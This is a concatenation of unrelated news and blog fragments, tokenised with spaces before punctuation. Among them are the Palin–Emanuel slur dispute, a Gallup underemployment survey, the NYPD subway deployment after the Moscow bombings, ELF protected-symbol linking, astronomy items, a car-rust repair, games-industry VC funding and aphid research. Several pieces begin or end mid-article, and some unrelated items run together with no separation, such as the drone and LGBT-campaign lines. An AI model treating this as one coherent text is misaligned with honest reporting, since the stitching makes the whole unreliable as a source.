Flats are also utilized , and expanded upon in more detail in your specification package .
If your garment contains any unusual design features or requires specific sewing techniques , it is wise to also have illustrations made up to show these in detail .
Along with a sewn sample , it will ensure that your sewing contractor understands what you expect your garment to look like .
A side note , some sewing contractors will sew your first samples , others prefer that you or a sample maker do .
Once you have your illustration , front and back , you will use this on your patten card , construction notes , measurement chart ( for grading ) , and often on your company 's line sheets .
For questions or more information on technical illustrations for your company , please email Xochil .
Palin goes after Emanuel on ' retarded ' slur
On Facebook , Sarah Palin launched today an unusual , personal attack on the chief of staff in response to a report that he 'd dismissed progressives ' attempts to pressure Senate centrists as " retarded . "
Her heading : " Are You Capable of Decency , Rahm Emanuel ? "
I would ask the president to show decency in this process by eliminating one member of that inner circle , Mr. Rahm Emanuel , and not allow Rahm ’s continued indecent tactics to cloud efforts .
Yes , Rahm is known for his caustic , crude references about those with whom he disagrees , but his recent tirade against participants in a strategy session was such a strong slap in many American faces that our president is doing himself a disservice by seeming to condone Rahm ’s recent sick and offensive tactic .
The Obama Administration ’s Chief of Staff scolded participants , calling them , “ F--- ing retarded , ” according to several participants , as reported in the Wall Street Journal .
Just as we’d be appalled if any public figure of Rahm ’s stature ever used the “ N - word ” or other such inappropriate language , Rahm ’s slur on all God ’s children with cognitive and developmental disabilities — and the people who love them — is unacceptable , and it ’s heartbreaking .
A patriot in North Andover , Massachusetts , notified me of Rahm ’s “ retarded ” slam .
I join this gentleman , who is the father of a beautiful child born with Down Syndrome , in asking why the Special Olympics , National Down Syndrome Society and other groups condemning Rahm ’s degrading scolding have been completely ignored by the White House .
No comment from his boss , the president ?
UPDATE : Emanuel has acknowledges calling liberal Democrats " retarded " and apologized for the remark , a White House official said .
" Rahm called Tim Shriver Wednesday to apologize , and the apology was accepted , " the official said .
“ The White House remains committed to addressing the concerns and needs of Americans living with disabilities and recognizes that derogatory remarks demean us all . ”
A new Facebook campaign called ' Faces of Equality ' has started to show that there are many different types of people who support LGBT equality .
The group aims to show that queer supporters and allies come in all forms and that we are diverse when it comes to race , religion , ethnicity , gender , political affiliation and sexual orientation .

Call it a cosmic growth spurt .
A young galaxy is making stars over 100 times as vigorously as the Milky Way .
SMM J21350 -0102 is shrouded in dust , which hides it from most telescopes .
But the Atacama Pathfinder Experiment ( APEX ) in Chile , spotted the galaxy via sub- millimetre radio waves emitted by the dust .
Light from the galaxy is absorbed by the dust , emitted as infrared and stretched to radio waves as the universe expands .
Its brightness and size is boosted by the magnification of a galaxy cluster that lies in front .
This allowed a team led by Mark Swinbank of the University of Durham , UK , to resolve individual clouds of star formation .
They calculated that the galaxy was churning out 250 suns a year .
The team thinks a merger of galaxies is driving star formation , “ but we do not yet understand the physics ” , says Swinbank .

The second thing to remember is that job approval is only one measure of how well a president connects with the electorate .
At the conclusion of his Wednesday appearance on Fox News , insolent interviewer Bret Baier interrupted the president for the umpteenth time to ask him if he thought that the health care bill would pass .
Obama responded with a familiar line : “ I do .
I ’m confident it will pass .
And the reason I ’m confident that it ’s going to pass is because it ’s the right thing to do . ”
This idea that he wants reform “ because it ’s the right thing to do ” resonates with people .
Whether they agree with him or not , they seem to genuinely believe that he has good intentions and that he is , at his base , a good man .
This view of him has so penetrated the public that it often goes unspoken .
But , it shows up in the polls , albeit in indirect ways .
For instance , a Pew Research Center poll released on Thursday found that despite Obama ’s 46 percent approval rating , 61 percent of Americans still say that he is inspiring .
Furthermore , 57 percent describe him as decisive , 54 percent say that he still makes them feel hopeful and 49 percent said that he still makes them feel proud .
Only about a third would describe him in negative terms like arrogant and detached , or would say that he makes them feel angry .
Now for something really controversial : what ’s wrong with protected symbols ?
In an ELF shared library , an ordinary global symbol may be overridden if a symbol of the same name is defined in the executable or in a shared library which appears earlier in the runtime search path .
This is called symbol interposition .
It is often used with functions such as malloc .
A shared library can define malloc and it can have code which calls malloc .
If the executable linked with the shared library defines malloc itself , then the version in the executable will be used rather than the version in the shared library .
This permits the executable to control the memory allocation done by the shared library , perhaps for debugging or logging purposes .
In this regard , shared libraries act much as static archives do .
This has a few consequences .
One of them is that within a shared library , all references to a global symbol must use the GOT and PLT , to make the overriding possible .
That means that all function calls and variable accesses are slightly slower .
Also , some compiler optimizations are forbidden : the compiler can not inline a call to a global symbol , since that symbol might be overridden at run time .
When building a shared library , you can provide a version script which indicates that some symbols are actually not global .
That can eliminate the GOT and PLT accesses , but it does not permit the compiler optimizations , and you do have to write that version script and keep it up to date .
When compiling code that goes into a shared library , you can set the visibility of symbols .
You can use hidden visibility , which means that the symbol is not visible outside the shared library .
You can use internal visibility , which is a lot like hidden — I ’ll skip the difference here .
Or you can use protected visibility .
Protected visibility means that the symbol is visible outside of the shared library , and can be accessed as usual .
However , all references from within the shared library will use the definition in the shared library .
In other words , the symbol acts more or less as usual , but it can not be overridden .
This means that accesses to the symbol avoid the GOT and PLT , and it permits compiler optimizations .
So , what ’s wrong with them ?
It turns out that protected symbols are slower at dynamic link time , which means that programs which use the shared library start up slower .
This happens because of the C rule that two pointers to the same function must compare as equal .
Since protected symbols are globally visible , you can get a pointer to a protected function in the main executable .
You can also get a pointer to that same function in the shared library , of course .
Those pointers have to be equal , or the C rule will break .
As noted , the access to the function in the shared library will not use the GOT or PLT .
The access in the main executable obviously will use the PLT .
How can we make those function pointers equal ?
We can ’t .
The executable will have a direct reference to the PLT .
The shared library will have a direct reference to the function itself .
In neither case will there be a relocation for the reference .
So there is no way to make the results equal .
( This can work for some targets , but not for ones with simple function references like the x86 targets . )
So , I must have lied .
The lie was that there is a case where you need to use the GOT for a protected symbol : when compiling position independent code for a shared library , and taking the address of a protected function , you need to use the GOT .
Unfortunately , gcc for the x86_64 target , surely the most widely used gcc target today , gets this wrong : http://gcc.gnu.org/PR19520.
This generally reveals itself as an error report when you go to create a shared library : relocation R_X86_64 _PC32 against protected symbol ` NAME ' can not be used when making a shared object .
In any case , when the compiler gets it right , the dynamic linker has to fill in that GOT entry .
In order to make the function pointers compare as equal , it has to fill in the entry with the address of the PLT in the executable ( or the earlier shared library ) .
But remember , this is a protected symbol , and protected symbols do n’t support symbol interposition .
So the dynamic linker must only use the PLT of the executable if the reference in the executable refers to the definition in the shared library .
That means that when the dynamic linker sees a reloc against a protected symbol in a shared library , it has to do another walk through the executable and earlier shared libraries to see if any of them have a definition for the symbol , in which case the GOT entry must not be set to that earlier PLT entry but must instead be set to the address of the symbol in the shared library itself .
This check has to be done for every symbol in the shared library .
Those extra symbol resolution passes means a slow down for every program which uses the shared library , and that is what is wrong with protected symbols .
So how do you get the compiler and linker speedups available by avoiding symbol interpositioning ?
Unfortunately , you have to give your symbols hidden visibility , which means that they can not be accessed from other modules .
Assuming you do want them to be accessed , you need to define symbol aliases for the ones which should be publicly visible .
That means that you need to use different names for the hidden symbols .
This is awkward at best .
Unfortunately I have nothing better to offer .
ELF is designed to support symbol interpositioning , and there is no very good way to avoid that without causing other consequences .
The Civil Aviation Authority ( CAA ) must be satisfied the aircraft has the same ability as a piloted plane to spot unexpected obstacles and take action to avoid them , before they will be let loose above Britain .
The CAA also restricts the use of drones for surveillance because of concerns about invasion of privacy .
Stand clear of the submachine guns .
In an unusual move , a heavily armed NYPD security battalion with enough firepower to wipe out Downtown Brooklyn descended onto the city ’s subway trains yesterday in response to suicide bombings in Russia that killed dozens of passengers in Moscow ’s subway .
Bleary - eyed New Yorkers began their work weeks with a morning rush hour that featured city cops in full military gear , including helmets , goggles , body armor , sidearms and M16 assault rifles .
The underground arsenal startled sleepy straphangers , many of whom wondered whether the extra security was overkill .

“ I think it ’s excessive , ” said Holly Celentang , 26 , a rider from Queens .
“ It ’s Easter this week , and you have families with young kids on the subway , and I ’m sure cops with machine guns would scare them .
“ I feel there should have been a bit more of a thought process before they did this .
We ca n’t lose our heads over something that happened in another country and make New York City look like we are at war . ”
Torey Deprisest , 23 , who was vacationing from Ohio , said he was stunned at the show of force .
“ I think it ’s ridiculous , ” Deprisest said .
“ The attack happened in a different country and had nothing to do with Americans .
I ’d be nervous seeing cops with machine guns on the train .
It makes people afraid when they do n’t need to be . ”
But other riders praised the heavily armed cop presence .
“ I do n’t think it ’s overkill .
We need to be protected — you never know , ” said Renee Burke , 56 , of Manhattan .
“ After 9/11 , we learned the hard way that anything is possible .
I feel protected when I see police riding the subway . ”
Joe Kerick , 46 , of New Jersey , agreed , saying : “ Better overkill than under - response .
If the terrorists see an under - response , they may think we are vulnerable . ”
City and MTA officials dialed up security a few notches after two female suicide bombers blew themselves up in twin attacks on the Moscow subway system early yesterday morning , killing at least 38 people .
Officials quickly said the coordinated attacks were isolated to tensions between Russia and dissident Chechens .
Russian Prime Minister Vladimir Putin blamed Islamic separatists in the Caucasus region , where Russian forces fought the Chechens a decade ago .
Even so , New York City authorities said they were taking no chances .
Officials doubled patrols of the subway system and dispatched NYPD ’s heavily armed Hercules units to several transit hubs , including Penn Station and Grand Central Terminal .
Regular NYPD cops usually assigned to the city ’s subways overnight also were held in place so they overlapped with the day tour .
Mayor Bloomberg said authorities “ did ramp up our coverage a little bit this morning ” after the Moscow bombings .
“ We change it every day , and for security reasons , obviously , we ’re not going to tell anybody what we ’re doing , ” Bloomberg said .
“ But you can rest assured we have great interest in what goes on around the world . ”
An NYPD spokesman said there was no indication that the Moscow attacks were related to anything planned against the New York City subway system .
Officials said cops made similar armed forays after 9/11 and after attacks on London ’s transit system in 2005 killed 52 people .
But the presence of the heavily armed cops actually on trains is rare .
Several al Qaeda - linked subway bomb plots in the city have been foiled in recent years , including a plan by Afghan immigrant Najibullah Zazi to detonate a bomb on the system .
Local Russians followed the Moscow developments closely and denounced the attacks in their home country as senseless .
“ I feel so terrible , ” said Vladimir Traynin , 51 , of Brooklyn ’s Brighton Beach .
“ I lived five minutes from where it happened , and I know the area very well .
I feel scared for people ’s safety .
They are in shock . ”
Oleh Kachur , 46 , also of Brighton Beach , said the attack did not surprise him .
“ You can predict this for now and in the future , ” Kachur said .
“ It ’s a problem of religion .
We have to treat people equally whether they are Chechen or Russian . ”

Most car enthusiasts hate rust with a passion , because once it starts it never seems to go away .
However , growing up in Massachusetts , you quickly realize that cars without rust do n’t exist in our area , and rust is just a part of life .
Naturally , I want to do everything in my power to have a rust free car , and last summer , I found some rust hiding in the deepest darkest regions of my 1964 Chevy Impala .
Describing where this metal came from is somewhat tough , but I ’ll do my best .
Ok , imagine a 1964 impala ( sweet right ? ) , now open the gas filler door .
You see the filler pipe with the gas cap on the top of it .
Surrounding that pipe is a piece of metal that is welded to the inside of the outer wheel house .
This is THAT piece !
Naturally water collects in there and rots out the whole area .
I was n’t having that so I tore it all out and began the rebuild .
First I removed it from the car and evaluated the situation at hand .
The outer perimeter was completely rotted out and needing replacing .
I then cut all the edges off of it and began making replacements from flat sheetmetal .
You can see where I welded the new pieces in on the back side in the next picture .
With some of the compound curves , there is some metal stretching and shrinking involved .
This can be done with hammers and dollies if you are really good , or you can buy yourself a metal stretcher & shrinker to make the job 1 million times easier .
In any case , new pieces were then welded in and ground down to make them pretty again .
Then I decided that the easiest way to clean it up completely was to blast it with some extra fine sand .
So blast I did .

Network execs hate Jerry Seinfeld 's new show as much as we do .
It 's their own fault for the Leno fiasco , and now they 're using Yiddish words and shaking in their " deep doo - doo . "
Real - life Costanza says it 's all about ego .
Interestingly , the Post 's write - up is by Jerry Oppenheimer , king of the brutal unauthorized biography , including a one on Seinfeld .
Watch him do his thing :
" Jerry could have walked in the door with a show based on a guy sitting with a paper bag over his head and it would have been green - lighted , " said the executive .
" His name and fame is golden , and the network needs all the help it can get .
" If you know the Yiddish term kvelling , that 's what the executives were doing .
They were rejoicing .
Jerry 's back !
Seinfeld 's in the house again ! "
Seinfeld 's estranged pal Costanza — who inspired the Seinfeld character with his name — dishes , even though he does n't talk to Jerry anymore .
Mike Costanza , a former pal of Seinfeld 's , believes he decided to do " The Marriage Ref " because of " ego , pure ego . " ... Costanza , a Long Island real estate agent , said Jerry was typical of " people who need to know that they can do it again .
They had this one unbelievable success and they need to feel that they can do it again .
That it was n't just luck .
I 'm not in the least surprised that Jerry 's doing this new show .
I always knew he was going to do something again .
And anything he does is a fully measured and thought - out thing . "

No you really can't make this up :
A supporter sent her the biblical passage Isaiah 49:16 : " See , I have engraved you on the palms of my hands ; your walls are ever before me . "
" If what was good enough for God , scribbling on the palm of his hand , it 's good enough for me , for us , " Palin said .
" In that passage he says , I wrote your name on the palm of my hand to remember you .
And I 'm like okay , I 'm in good company . "
What some liberals fail to see in their Pavlovian reaction to this riff is that it was clearly meant partly as a joke , and partly as a way of cementing her identity with the Christianist base .
The response is interesting : the crowd both applauds and laughs .
She uses the trope of evangelical literal use of the Bible to justify everything and anything - and she does it jokingly as another jibe against the " mainstream media " with a bit of self - deprecation thrown in .
Genius .
It also provokes a response from the liberal blogosphere and media that cements the idea that she is out of her mind , a religious nut - job , etc , which completes the circle for her base .
In this populist climate , with recession continuing , with alienation high , with fundamentalism at the heart of the new Republicanism , she is not to be under - estimated or dismissed .
She is the next Republican nominee by default at this point .

David Carlyle Rocastle seemed destined for a glittering career on the world stage .
By the time he was 23 years old , the Lewisham - born midfielder had already collected more than a dozen England caps .
His weaving runs dazzled the home fans at Highbury and by the end of the 1988 - 89 season he had won his first Division One title to add to his Milk Cup winners ' medal two years earlier .
Rocastle 's talent was evident from an early age and from his initial outings in the first team at Arsenal , it was clear that he had the makings of future international .
Indeed ' Rocky ' was named Barclay 's Young Eagle of the Year and was a permanent fixture in the England team which was building towards the 1990 World Cup in Italy .
But just as swiftly as he had sprung to prominence , Rocastle found himself out of favour with both his club and country .
Dip in form
As Arsenal struggled to retain their title , so the midfielder 's form dipped and the season ended with his exclusion from Bobby Robson 's final party for Italia '90 .
Although he started the following season back in favour at Highbury , he was dropped in November and then suffered a broken toe , having to battle to make enough appearances to claim his second league championship medal .
However a switch to a central midfield role saw him thrive again for the champions and earn a recall by new England coach Graham Taylor , his mid-career blip seemingly behind him .
Yet he was to leave his spiritual home in a shock move to Leeds , recently crowned kings of English football , in a £ 2 million switch in the summer of 1992 .
But it was not to be the dream move either player or club had envisaged .
The midfield gem began to lose some of his sparkle and he endured a battle against injury which would follow him to Manchester City and then Chelsea .
Despite a return to the city of his birth , Rocastle was never able to recapture the form which had made him one of the most exciting properties in English football during his time at Highbury .
' Rocky ' punches back
A loan move to First Divison Norwich at the start of 1997 saw Rocky once again at his creative best , pulling the strings in the middle of the park , albeit against a lower standard of opposition .
But despite a successful two - month stint at Carrow Road , a permanent deal was never on the cards and he once again returned to the capital before joining Hull City in Division Three on loan .
WASHINGTON , D.C. -- Gallup 's daily measure of U.S. employment reveals that 19.9 % of the U.S. workforce was underemployed during the month of January , translating to close to 30 million Americans who are working less than their desired capacity .
Those who were underemployed reported spending 36 % less than those who were employed , $ 48 per day versus $ 75 per day .
These results are based on January interviews with more than 20,000 adults in the U.S. workforce , aged 18 and older .
Gallup classifies respondents as " employed " if they are employed full time or are employed part time but do not want to work full time .
Gallup classifies respondents as " underemployed " if they are employed part time but want to work full time or are unemployed .
" The underemployed are less likely than the employed to say they are able to make a major purchase , such as a car or home repair , if needed . "
As unemployment rates remain high , reduced spending by millions of underemployed Americans has obvious implications for economic recovery .
Spending is , however , just one of many ways underemployment costs the U.S. and hurts its workforce .
Gallup 's employment measure also reveals further disparities between the employed and the underemployed on vital indicators such as attitudes toward money , access to healthcare , demographics , and wellbeing .
Personal Finances
Underemployment is generally associated with a less - than - desired income , and Gallup data highlight the stark contrast in spending attitudes between the employed and the underemployed .
Sixty percent of employed respondents feel good about the amount of money they have to spend , while only half as many ( 29 % ) of the underemployed report feeling good .
Further , the underemployed are less likely than the employed to say they are able to make a major purchase , such as a car or home repair , if needed ( 25 % vs. 58 % , respectively ) .
Particularly noteworthy are the differences in the groups ' reported ability to afford basic necessities .
Slightly more than half ( 56 % ) of underemployed respondents say they have enough money to buy the things they need , compared to 84 % of employed respondents .
Additionally , respondents who are underemployed are more likely to report that they did not have enough money for food , shelter , or healthcare at some time during the past 12 months .
Healthcare
Access to preventative care and health insurance also differ between the employed and the underemployed , illustrating the strain that high underemployment can place on the healthcare system .
The underemployed are less likely than the employed to have health insurance ( 59 % vs. 87 % , respectively ) , to have had enough money for healthcare ( 63 % vs. 85 % ) , to have a personal doctor ( 63 % vs. 81 % ) or to have visited a dentist in the last 12 months ( 57 % vs. 72 % ) .
Demographics
There are several important demographic differences between the employed and the underemployed .
While numerous reports have highlighted men's struggles to find employment during the current economic downturn , Gallup data indicate that underemployment levels among women ( 21 % ) are similar to those among men ( 19 % ) .
Adults aged 18 to 29 are almost twice as likely ( 31 % ) to be underemployed as 30 - to 49 - year olds ( 17 % ) and 50 - to 65 - year - olds ( 17 % ) are .
Underemployment declines with increasing education levels .
While nearly 4 in 10 respondents ( 38 % ) with less than a high school diploma are underemployed , the figure drops to 12 % among those with a four - year college degree and further to 10 % for those with education beyond college .
Among racial and ethnic groups , blacks ( 27 % ) and Hispanics ( 29 % ) are most likely to be underemployed , while non-Hispanic whites ( 17 % ) are least likely .
Taken as a whole , the employment status of certain demographic groups is bleak .
Gallup 's data illustrate that full employment is not available to all U.S. workers , and opportunities for employment are in short supply for American youth and minorities .
Presidential Approval
Employment status is related to a number of political and ideological variables .
As one example , underemployed Americans ( 55 % ) are more likely than the employed ( 48 % ) to approve of the way Barack Obama is handling his job as president .
During the same time period , 49 % of the American population approved of Obama 's job performance .
As a point of reference , among the employed , 29 % identify themselves as Republicans , 31 % as Democrats , and 33 % as independents .
Twenty - two percent of the underemployed identify as Republicans , 34 % as Democrats , and 35 % as independents .
Wellbeing
Individuals who are employed ( 60 % ) are more likely than the underemployed ( 40 % ) to be classified by Gallup as " thriving . "
Those who are thriving respond affirmatively to present - and future - circumstance questions based on the Cantril Self - Anchoring Striving Scale , which asks respondents to evaluate their present and future lives on a ladder scale , with steps numbered from 0 to 10 .
By comparison , 53 % of the U.S. population in general was classified as thriving during the same period .
Bottom Line
Gallup data spotlight the stressors faced by 30 million underemployed Americans .
Underemployed Americans report spending 36 % less than their employed counterparts on average , potentially costing the U.S. economy hundreds of millions of dollars as underemployment continues to remain high .
Compared with employed respondents , underemployed respondents also report greater difficulty in affording basic necessities , have lower levels of access to healthcare , have less satisfaction with their financial resources , and evaluate their lives less favorably .
Learn more about Gallup 's economic measures .
Survey Methods
Results are based on telephone interviews with 20,503 national adults , aged 18 and older , conducted Jan. 2 -31 , 2010 , as part of Gallup Daily tracking .
For results based on the total sample of national adults , one can say with 95 % confidence that the maximum margin of sampling error is ±1 percentage point .
Interviews are conducted with respondents on land - line telephones ( for respondents with a landline telephone ) and cellular phones ( for respondents who are cell - phone only ) .
In addition to sampling error , question wording and practical difficulties in conducting surveys can introduce error or bias into the findings of public opinion polls .

Veteranmotorsykler , eller vintage motorsykler , har sin egen sjarm .
De er ofte mer unike og spesielle enn dagens modeller , og en gammel motorsykkel trenger slett ikke å være en dårlig motorsykkel .
Det avhenger jo først og fremst av hvordan den har blitt tatt vare på .
Veteranmotorsykler kan brukes både til turkjøring , til konkurranser og når man skal på ferie .
Dersom sykkelen er godt vedlikeholdt , trenger ikke ferieturen å by på større problemer .
Mange som eier veteranmotorsykler har også pusset dem opp på egen hånd , og kjenner syklene sine godt .
Derfor er eierne som regel i stand til å reparere småfeil selv dersom noe skulle skje på veien .
Selv om veteranmotorsyklene har noen år på baken , er det ikke bare eldre folk som eier disse syklene .
Tvert imot er det mange ungdommer og unge voksne som liker veteransykler .
Det kan være mange årsaker til det .
En gammel og velbrukt motorsykkel kan være rimeligere i innkjøp , og det kan være mye morsommere å mekke på en gammel sykkel enn å kjøpe en ny .
De gamle motorsyklene skiller seg også litt ut fra mengden , og de har mer personlighet enn nye sykler .
Det er mange som elsker veteranmotorsykler , og det finnes egne klubber for folk som eier veteransykler .
Norsk Veteran Motorsykkel Club er den største veteransykkelklubben i Norge .
De har mer enn 3000 medlemmer , og nettsiden deres er full av informasjon og nyheter .
De formidler også kjøp og salg av deler .
Av og til arrangeres det egne ritt for veteranmotorsykler .
Dette kan man også lese mer om på nettsiden til NVMC , som har en løpskalender som viser kommende konkurranser .
Mange av de lokale klubbene arrangerer også egne turer for medlemmene sine .
Det er også fint å dra på ferie med veteranmotorsykkelen sin .
Det er morsomt å dra sammen med andre , men man kan også dra alene .
Når man kjører alene , bestemmer man alt selv .
Noen av veistrekningene i Norge kan by på ulike utfordringer , avhengig av hvilken stand sykkelen er i .
Man må selvsagt sjekke at alt er i orden før man drar hjemmefra , og man må kjenne sykkelens begrensninger , dersom det finnes noen .
Hvis man har motorsykkel med sidevogn , kan man enten ta med en passasjer , eller man kan ta med seg mer utstyr , som eget telt .
Et telt er praktisk , for da kan man overnatte nesten hvor man vil , og man sparer mange penger på leie av hytte eller hotellrom .
Hvis det blir kjedelig i teltet om kveldene , kan man kose seg med spill på mobilen eller på nettbrettet .
Selv om motorsykkelen er av god , gammel årgang , trenger man jo ikke å forsake alt av moderne teknologi .
Veteranmotorsykler bør brukes , så sant det er mulig .
Det er liten vits i å ha en gammel sykkel stående dersom den ikke er i kjørbar stand , og de fleste som eier veteranmotorsykler liker å mekke på dem og holde dem i stand .
Eierne liker også å kjøre syklene , og dersom man drar på sommerferie med motorsykkelen , kan man både se mer av Norge og man får kjøre ekstra mye med sykkelen .

On one side hot hydrogen gas is illuminated by a supergiant blue star called V391 Velorum .
New star formation is taking place within the ribbon of luminous and dark material that brackets V391 Velorum ’s left in this perspective .
After many millennia , these fledgling stars , coupled with the explosive demise of V391 Velorum as a supernova , will likely alter Gum 19 ’s present Janus - like appearance .
Gum 19 is located in the direction of the constellation Vela ( the Sail ) at a distance of approximately 22 000 light years .
The Gum 19 moniker derives from a 1955 publication by the Australian astrophysicist Colin S. Gum that served as the first significant survey of so - called HII ( read “ H - two ” ) regions in the southern sky .
HII refers to hydrogen gas that is ionised , or energised to the extent that the hydrogen atoms lose their electrons .
Such regions emit light at well - defined wavelengths ( or colours ) , thereby giving these cosmic clouds their characteristic glow .
And indeed , much like terrestrial clouds , the shapes and textures of these HII regions change as time passes , though over the course of eons rather than before our eyes .
For now , Gum 19 has somewhat of a science fiction - esque , “ rip in spacetime ” look to it in this image , with a narrow , near - vertical bright region slashing across the nebula .
Looking at it , you could possibly see a resemblance to a two - toned angelfish or an arrow with a darkened point .
This new image of the evocative Gum 19 object was captured by an infrared instrument called SOFI , mounted on ESO ’s New Technology Telescope ( NTT ) that operates at the La Silla Observatory in Chile .
SOFI stands for Son of ISAAC , after the “ father ” instrument , ISAAC , that is located at ESO ’s Very Large Telescope observatory at Paranal to the north of La Silla .
Observing this nebula in the infrared allows astronomers to see through at least parts of the dust .
The furnace that fuels Gum 19 ’s luminosity is a gigantic , superhot star called V391 Velorum .
Shining brightest in the scorching blue range of visible light , V391 Velorum boasts a surface temperature in the vicinity of 30 000 degrees Celsius .
This massive star has a temperamental nature , however , and is categorised as a variable star accordingly .
V391 Velorum ’s brightness can fluctuate suddenly as a result of strong activity that can include ejections of shells of matter , which contribute to Gum 19 ’s composition and light emissions .
Stars on the grand scale of V391 Velorum do not burn bright for long , and after a relatively short lifetime of about ten million years these titans blow up as supernovae .
These explosions , which temporarily rival whole galaxies in their light intensity , blast heated matter in surrounding space , an event that can radically change the colour and shape of its enclosing nebula .
As such , V391 Velorum ’s death throes may well leave Gum 19 unrecognisable .
Within the neighbourhood of this fitful supergiant , new stars nonetheless continue to grow .
HII regions denote sites of active star formation wherein great quantities of gas and dust have begun to collapse under their own gravity .
In several million years — a blink of an eye in cosmic time — these shrinking knots of matter will eventually reach the high density at their centres necessary to ignite nuclear fusion .
The fresh outpouring of energy and stellar winds from these newborn stars will also modify the gaseous landscape of Gum 19 .

The following blog post , unless otherwise noted , was written by a member of Gamasutras community .
The thoughts and opinions expressed are those of the writer and not Gamasutra or its parent company .
Alice Taylor ( of @wonderlandblog / Channel 4 fame ) tweeted last week to ask why games companies could n’t get VC funding in this country .
I promised an answer in the blog , and here it is .
The basic answer is that they can .
However , most games companies ( and , in fact , most wannabe entrepreneurs ) completely fail to understand what investors want .
Almost all the time .
I am continually amazed about little effort games companies put into understanding financiers .
And then even more amazed that they get upset when they do n’t receive investment .
Point 1 : VCs do n’t invest in projects
This is the biggest misconception of them all .
Games developers are good at pitching projects .
For three decades , the most successful developers have honed their skills at pitching to green - light committees at publishers .
They are the only customers who really matter , financially , for an independent studio .
So developers polish prototypes .
They hone game design .
They convince the publishers that * this game * will be the GTA / Modern Warfare / Dragon Age* beater .
Investors do n’t care .
Really , they do n’t .
And what ’s more , they should n’t .
Can an investor seriously claim to know more about what makes a good game than publishers ?
About what will sell and generate a good risk - weighted return ?
An investor is dependent on the developer ’s opinion , and frankly , developers have a habit of getting more excited about their concept than the market potential or financial return .
( Which is fine , BTW , if you ’re happy to outsource all of that stuff to the publisher , and let them take the lion ’s share of the profit too ) .
Investors care about businesses ; developers show them projects .
Point 2 : Investors want to see a running business , not an idea
Many entrepreneurs ( and pretty well anyone who is foolish enough to choose to appear on Dragon ’s Den ) think ideas are valuable .
Seasoned entrepreneurs know that they are not .
Ask yourself how many ideas there are for games – good games – within your development studio right now .
Ten ?
A hundred ?
A thousand ?
I would bet that there are more great ideas than your studio could possibly develop in a century .
The same is true for investors .
They see hundreds of great companies every year , who are already executing on an idea .
They see more wannabe entrepreneurs than that , all of whom get frustrated because “ if only they had the money , they could turn this brilliant idea into reality . ”
Entrepreneurs do n’t wait for the money .
They do it anyway .
Point 3 : VCs want sustainable businesses
Traditional games developers are really difficult for any investor to fund .
They look like quite late - stage businesses : they may have hundreds of staff , millions in turnover and a proven track record .
But fundamentally , they are always just one deal away from bankruptcy .
They look like startups from a risk perspective but are like late stage investments from a reward perspective .
Games developers always think that VCs want too much of their equity ; VCs think that the risk is so high they need a huge slug of the company to compensate them for the risk they are taking .
There is rarely a meeting of minds .
Broadly speaking , traditional games developers are just too risky for VCs .
Point 4 : History sucks
Just taking British examples , investors have seen failures in Warthog , Argonaut , Elixir …
They ’ve seen poor returns from Lionhead and Kuju .
Talking to investors a couple of years ago and they shook their heads sadly about the games industry , saying it was just not for them .
The good news
Investor perception is changing .
In fact , I would go so far as to say that we are about to enter another bubble , where too much money is chasing too few assets , and in the ensuing carnage , margins will be competed away , bad companies will survive for too long and good companies will die through hubris and bad luck .
( But that ’s a topic for another post ) .
However , for traditional games developers , the news is not all good .
Investors do n’t want AAA content .
They do n’t want games that are products , whether those are on console , PSN / XBLA or smartphones .
They want Games As A Service .
They want ongoing revenue streams .
They want virtual goods .
They want free distribution with an upsell model .
They want browser - based games .
There is a wall of money flooding into games right now .
It just ai n’t coming to console .

Tomorrow , I ’ll post about the difference between seed , Series A and Series B funding , why it is so misunderstood by games companies and how getting the wrong investor at the wrong time can destroy your company .

One of the founding principles of Darwin 's theory is that biological evolution has been shaped by the survival of the fittest .
Things , however , are not always that simple as researchers from Royal Holloway , University of London have discovered while analysing the social behaviour of aphids .
A few aphid species have " soldiers " who stop reproducing and instead contribute to the public good .
Not only do they risk their lives to defend the nest from invaders , but they also mend and clean it .
The repair work involves the aphids secreting a glue - like substance from their bodies -- comprising two thirds of their body size .
They use their legs to mix it and form a scab .
But many of the soldier aphids die from the significant loss of body mass .
Without the soldiers ' efforts all the aphids could be destroyed by a predator or the nest could fall apart .
Researchers from Royal Holloway wanted to discover whether the selfless behaviour of the soldiers was putting them in danger of being wiped out by selfish free - riders who come to inhabit the nests .
These " immigrant " aphids do not contribute to the running of the nest and continue to reproduce at a normal rate .
An average nest will have 25 % immigrants , allowing free - riders a chance to spread throughout the population at large , similar to the spread of a tumour .
The study , " The impact of colonial mixing on the evolution of social behaviour in aphids , " is being published in Proceedings of the Royal Society B ( 3 February 2010 ) .
Dr John Bryden , from the School of Biological Sciences at Royal Holloway , said , " We are interested in understanding why animals are nice to each other -- why they show social behaviour .
This is puzzling because , in a fiercely competitive fight for resources , helping others seems like a fool 's game . "
The academics attempted to answer the question by making a mathematical model .
" It turned out that the complex lifecycle of the aphids can be captured in simple numbers expressing levels of relatedness , that help understand why social behaviour can evolve .
What surprised us is not that this is possible , this has long been known , but that something so difficult can be boiled down to something so simple , " says Vincent Jansen , Professor of Mathematical Biology at Royal Holloway .
" We know that helping behaviour can evolve if the recipient is more likely than an average member of the population to show the same behaviour .
This likelihood of being the same is called relatedness .
As relatedness is increased , more helpful behaviour will evolve .
What is n't well known is how we can predict the relatedness of a population and how that will affect the levels of social behaviour , " says Dr Bryden .
The study shows how it is possible to reduce the complex system of aphids growing , living in , and migrating between nests down to a simple equation -- predicting the relatedness of the aphid system .
" We have discovered that immigration can reduce the level of social behaviour , but that the quite surprising levels of immigration that we see in aphids is still not sufficient to trigger a full - scale collapse of the aphid 's societies , " adds Dr Bryden .
The scientists say the model they have created can be reused , with additions and modifications , to try and understand more complex social behaviour in other animals .
Dr Bryden , said , " The goal of modelling and understanding human societies is still a long way away , but we hope that through tackling increasingly complex biological systems we can take steps toward that goal . "
“ Second Life has some people in it that have become so addicted that they have totally lost touch with reality and when they see people in their prim homes that do n’t belong , seem to think it ’s akin to something like irl burglary or breaking and entering .
These people , the extremists , have stunk up the place for everyone else .
I mean * really * fouled it up .
That ’s why I wo n’t be back in SL in the foreseeable future .
I definitely should have mentioned it though , to find out exactly how the hell pixels in Second Life can make you scared and unsure .
Are the pixels going to get you ? ”
KANSAS CITY , Mo. -- Christian Laettner won two national titles , an Olympic gold and played 12 seasons in the NBA .
To this day , all anyone wants to talk about is The Shot. March 28 , 1992 , NCAA East Regional final at the Spectrum in Philadelphia .
Laettner catches a long inbounds pass with the clock nearly expired , turns and shoots , and sends Duke to a win over Kentucky and on to a national championship .
" People always approach me and ask about that game , every day of the year , especially when it comes tournament time , " Laettner said .
